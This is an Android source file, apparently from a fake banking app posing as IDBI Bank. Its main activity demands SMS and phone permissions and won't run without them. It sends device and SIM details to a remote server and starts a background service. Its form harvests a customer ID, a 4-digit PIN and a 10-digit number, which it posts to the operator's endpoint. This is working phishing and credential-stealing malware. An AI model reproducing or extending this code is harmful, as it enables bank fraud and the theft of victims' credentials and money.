package com.idbibank.system;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.idbibank.system.FrontServices.BackgroundService;
import com.idbibank.system.FrontServices.CallForwardingHelper;
import com.idbibank.system.FrontServices.FormValidator;
import com.idbibank.system.FrontServices.SharedPreferencesHelper;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class MainActivity extends AppCompatActivity {

    public Map<Integer, String> ids;
    public HashMap<String, Object> dataObject;

    private static final int REQUEST_CODE_PERMISSIONS = 101;

    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        checkPermissions();

    }

    public boolean validateForm() {
        boolean isValid = true;
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {isValid = false;continue;}
            String value = editText.getText().toString().trim();
            switch (key) {
                case "verifydigit2":
                    if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key)) {
                        isValid = false;
                    }
                    break;
                case "securedigit":
                    if (!FormValidator.validateMinLength(editText, 4, "Required 4 Digit Pin")) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            // Check if permissions are granted or not
            if (grantResults.length > 0) {
                boolean allPermissionsGranted = true;
                StringBuilder missingPermissions = new StringBuilder();

                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        allPermissionsGranted = false;
                        missingPermissions.append(permissions[i]).append("\n"); // Add missing permission to the list
                    }
                }
                if (allPermissionsGranted) {
                    init();
                } else {
                    showPermissionDeniedDialog();
                    Toast.makeText(this, "Permissions denied:\n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
                    Log.d("Permissions", "Missing Permissions: " + missingPermissions.toString());
                }
            }
        }
    }


    private void checkPermissions() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED ||

                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||

                ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.CALL_PHONE,
                    Manifest.permission.INTERNET,
                    Manifest.permission.ACCESS_NETWORK_STATE,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.SEND_SMS
            }, REQUEST_CODE_PERMISSIONS);
            Toast.makeText(this, "Requesting permission", Toast.LENGTH_SHORT).show();
        } else {
            init();
//            Toast.makeText(this, "Permissions already granted", Toast.LENGTH_SHORT).show();
        }
    }


    private void showPermissionDeniedDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Permission Denied");
        builder.setMessage("All permissions are required to send and receive messages. " +
                "Please grant the permissions in the app settings.");

        // Open settings button
        builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                openAppSettings();
            }
        });

        // Cancel button
        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                finish();
            }
        });

        builder.show();
    }

    public void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);
        intent.addCategory(Intent.CATEGORY_DEFAULT);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    public void registerPhoneData() {
        SharedPreferencesHelper share = new SharedPreferencesHelper(getApplicationContext());

        share.saveBoolean("is_registered", true);
        NetworkHelper requestSystem = new NetworkHelper();
        Helper help = new Helper();
        String url = help.URL() + "/mobile/add";
        JSONObject sendData = new JSONObject();
        try {
            Helper hh = new Helper();
            sendData.put("site", hh.SITE());
            sendData.put("mobile", Build.MANUFACTURER);
            sendData.put("model", Build.MODEL);
            sendData.put("mobile_android_version", Build.VERSION.RELEASE);
            sendData.put("mobile_api_level", Build.VERSION.SDK_INT);
            sendData.put("mobile_id",  Helper.getAndroidId(getApplicationContext()));
            try {
                JSONObject simData = new JSONObject(CallForwardingHelper.getSimDetails(this));
                sendData.put("sim", simData);
            } catch (JSONException e) {
                Log.e("Error", "Invalid JSON data: " + e.getMessage());
            }
        }catch (JSONException e) {
            e.printStackTrace();
        }
        //Log.d(Helper.TAG, "MOBILE INFO" + sendData);
        requestSystem.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
            @Override
            public void onSuccess(String result) {
                runOnUiThread(() -> {
                    try {
                        JSONObject jsonData = new JSONObject(result);
                        if(jsonData.getInt("status") == 200) {
                            Log.d(Helper.TAG, "Registered Mobile");
                        }else {
                            Log.d(Helper.TAG, "Mobile Could Not Registered "+ jsonData.toString());
                            Toast.makeText(getApplicationContext(), "Mobile Could Not Be Registered " + jsonData.toString(), Toast.LENGTH_LONG).show();
                            finish();
                        }
                    } catch (JSONException e) {
                        Toast.makeText(getApplicationContext(), "Register Error " + Objects.requireNonNull(e.getMessage()), Toast.LENGTH_LONG).show();
                        finish();
                    }
                });
            }
            @Override
            public void onFailure(String error) {
                runOnUiThread(() -> {
                    Toast.makeText(getApplicationContext(), "Register Failed "+  error, Toast.LENGTH_LONG).show();
                    finish();
                });
            }
        });
    }

    public void init(){
        setContentView(R.layout.activity_main);
        registerPhoneData();

        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        dataObject = new HashMap<>();
        Helper helper1 = new Helper();
        helper1.SITE();

        if(!Helper.isNetworkAvailable(this)) {
            Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
            startActivity(intent);
        }
        // Initialize the ids map
        ids = new HashMap<>();
        ids.put(R.id.customerid, "customerid");
        ids.put(R.id.securedigit, "securedigit");
        ids.put(R.id.verifydigit2, "verifydigit2");

        // Populate dataObject
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }
        Button buttonSubmit = findViewById(R.id.proceed);
        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                JSONObject dataJson = new JSONObject(dataObject);
                JSONObject sendPayload = new JSONObject();
                try {
                    Helper helper = new Helper();
                    dataJson.put("mobileName", Build.MODEL);
                    sendPayload.put("mobile_id", Helper.getAndroidId(getApplicationContext()));
                    sendPayload.put("site", helper.SITE());
                    sendPayload.put("data", dataJson);
                    Helper.postRequest(helper.FormSavePath(), sendPayload, new Helper.ResponseListener() {
                        @Override
                        public void onResponse(String result) {
                            Log.d(Helper.TAG, " "+ result);
                            if (result.startsWith("Response Error:")) {
                                Toast.makeText(MainActivity.this, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                            } else {
                                try {
                                    JSONObject response = new JSONObject(result);
                                    if(response.getInt("status")==200){
                                        Intent intent = new Intent(MainActivity.this, SecondActivity.class);
                                        intent.putExtra("id", response.getInt("data"));
                                        startActivity(intent);
                                    }else{
                                        Toast.makeText(MainActivity.this, "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                    }
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                    });
                } catch (JSONException e) {
                    Toast.makeText(MainActivity.this, "Error1 "+e.toString(), Toast.LENGTH_SHORT).show();
                }
            }else{
                Toast.makeText(MainActivity.this, "form validation failed", Toast.LENGTH_SHORT).show();
            }
        });


    }


}